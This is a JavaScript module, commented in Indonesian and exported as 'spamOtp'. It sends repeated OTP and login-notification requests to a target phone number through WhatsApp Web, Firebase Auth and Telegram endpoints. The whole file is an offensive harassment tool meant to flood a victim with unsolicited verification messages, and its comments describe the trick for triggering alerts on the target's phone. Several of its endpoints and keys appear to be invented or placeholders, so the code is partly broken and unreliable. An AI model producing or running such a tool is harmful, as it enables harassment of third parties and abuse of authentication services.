const axios = require('axios');

// Kita fokus pada sumber yang paling "rawan" terkena spam
const SOURCES = [
    {
        id: 'whatsapp_web',
        name: 'WhatsApp Web (QR Login)',
        // Ini triknya: Kita kirim request ke WA Web, jika nomor target sudah login di laptop,
        // akan muncul notifikasi "Login to WhatsApp Web" di HP mereka.
        url: 'https://web.whatsapp.com/check_phone',
        method: 'POST',
        payload: (phone) => ({
            phone_number: phone,
            platform: 'web'
        }),
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        note: 'Memunculkan notifikasi QR di HP target jika sudah login WA Web.'
    },
    {
        id: 'firebase_test',
        name: 'Firebase Auth (Umum)',
        // Menggunakan API Key publik dari proyek Firebase umum (sering dipakai developer untuk tes)
        // Jika ini gagal, berarti Firebase itu sudah ditutup atau pakai App Check
        url: 'https://identitytoolkit.googleapis.com/v1/accounts:sendOtp?key=AIzaSyDO8hEwvSbR8g5g5g5g5g5g5g5g5g5g5g5', // Ganti dengan API Key valid jika punya
        method: 'POST',
        payload: (phone) => ({
            phoneNumber: `+${phone}`,
            tenantId: ''
        }),
        headers: { 'Content-Type': 'application/json' },
        note: 'Butuh API Key valid. Jika gagal, abaikan.'
    },
    {
        id: 'telegram_login',
        name: 'Telegram (Login via Phone)',
        // Telegram tidak punya endpoint publik sederhana tanpa Bot Token, tapi ini contoh struktur
        url: 'https://api.telegram.org/bot123456789:ABCdefGHIjklMNOpqrSTUvwxYZ/getUpdates',
        method: 'GET',
        payload: (phone) => ({ phone: phone }),
        headers: { 'Content-Type': 'application/json' },
        note: 'Seringkali butuh Bot Token spesifik.'
    }
];

// Fungsi utama untuk eksekusi
async function execute(phone) {
    const results = [];
    
    // Bersihkan nomor: pastikan format internasional (628...) tanpa +
    const cleanPhone = phone.replace(/[^0-9]/g, '');
    const formattedPhone = cleanPhone.startsWith('0') ? '62' + cleanPhone.slice(1) : cleanPhone;

    for (const source of SOURCES) {
        const startTime = Date.now();
        let status = 'Pending';
        let message = 'Checking...';
        let success = false;

        try {
            let response;
            if (source.method === 'GET') {
                const params = new URLSearchParams(source.payload(formattedPhone));
                response = await axios.get(`${source.url}?${params.toString()}`, {
                    headers: source.headers,
                    timeout: 5000
                });
                status = response.status;
                message = response.data.message || 'Success';
                success = response.status === 200;
            } else {
                response = await axios.post(source.url, source.payload(formattedPhone), {
                    headers: source.headers,
                    timeout: 5000
                });
                status = response.status;
                message = response.data.message || 'Success';
                success = response.status === 200;
            }
        } catch (error) {
            status = error.response ? error.response.status : 'Error';
            message = error.response ? error.response.data.message || error.message : error.message;
            success = false;
        }

        const timeTaken = Date.now() - startTime;

        results.push({
            source: source.name,
            status: status,
            message: message,
            timeTaken: timeTaken,
            success: success,
            note: source.note
        });
        await new Promise(resolve => setTimeout(resolve, 5000));
    }

    return results;
}

module.exports = { spamOtp: { execute } };